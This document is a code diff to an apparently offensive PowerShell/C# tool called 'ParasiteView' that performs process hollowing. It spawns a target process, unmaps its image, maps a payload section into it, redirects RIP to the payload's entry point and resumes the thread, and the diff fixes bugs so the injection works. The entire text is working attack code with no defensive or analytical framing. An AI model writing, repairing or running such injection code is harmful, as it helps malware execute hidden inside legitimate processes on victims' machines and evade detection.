@@ -66,6 +66,9 @@ public static class NtNative {
     [DllImport("kernel32.dll")]
     public static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);
 
+    [DllImport("kernel32.dll")]
+    public static extern uint ResumeThread(IntPtr hThread);
+
     [StructLayout(LayoutKind.Sequential)]
     public struct PROCESS_INFORMATION {
         public IntPtr hProcess, hThread;
@@ -104,7 +107,7 @@ if ($payload.Length -gt $secSize) {
 
 # Parse EntryPoint
 $e_lfanew = [BitConverter]::ToInt32($payload, 0x3C)
-$entryOffset = $e_lfanew + 0x28  # Offset to AddressOfEntryPoint (for PE32+)
+$entryOffset = $e_lfanew + 0x28
 $entryPoint = [BitConverter]::ToInt32($payload, $entryOffset)
 Write-Host "[*] EntryPoint offset in payload.exe: 0x$("{0:X}" -f $entryPoint)"
 
@@ -126,24 +129,30 @@ if (-not [NtNative]::CreateProcess($targetBinary, $null, [IntPtr]::Zero, [IntPtr
     throw "CreateProcess failed: $(GetLastError())"
 }
 
-# 4. Unmap original memory in victim
-$status = [NtNative]::NtUnmapViewOfSection($pi.hProcess, $pi.hProcess.MainModule.BaseAddress)
+# 4. Get BaseAddress from context (Rdx = ImageBaseAddress)
+$ctx = New-Object CONTEXT64
+$ctx.ContextFlags = 0x100010
+[NtNative]::GetThreadContext($pi.hThread, [ref]$ctx)
+$imgBase = [IntPtr]::new([Int64]$ctx.Rdx)
+
+# 5. Unmap original image
+$status = [NtNative]::NtUnmapViewOfSection($pi.hProcess, $imgBase)
 if ($status -ne 0) { throw "NtUnmapViewOfSection failed: 0x{0:X}" -f $status }
 
-# 5. Map payload section into remote process
-$remoteBase = $pi.hProcess.MainModule.BaseAddress
+# 6. Map payload into remote process
+$remoteBase = $imgBase
 $viewSize = $secSize
 $status = [NtNative]::NtMapViewOfSection($hSection, $pi.hProcess, [ref]$remoteBase, [UIntPtr]::Zero, [UIntPtr]::Zero, [IntPtr]::Zero, [ref]$viewSize, 2, 0, 0x20)
 if ($status -ne 0) { throw "NtMapView (remote) failed: 0x{0:X}" -f $status }
 
-# 6. Patch RIP to EntryPoint
-$ctx = New-Object CONTEXT64
-$ctx.ContextFlags = 0x100000
+# 7. Patch RIP to payload entrypoint
+$ctx.ContextFlags = 0x100010
 [NtNative]::GetThreadContext($pi.hThread, [ref]$ctx)
 $ctx.Rip = [UInt64]$remoteBase + $entryPoint
 [NtNative]::SetThreadContext($pi.hThread, [ref]$ctx)
 Write-Host "[*] RIP set to: 0x$("{0:X}" -f $ctx.Rip)"
 
-# 7. Resume execution
-Resume-Process -Id $pi.dwProcessId
+# 8. Resume thread
+[NtNative]::ResumeThread($pi.hThread) | Out-Null
 Write-Host "[+] ParasiteView: Payload ejecutado desde sección pagefile-backed en proceso $($pi.dwProcessId)"
+
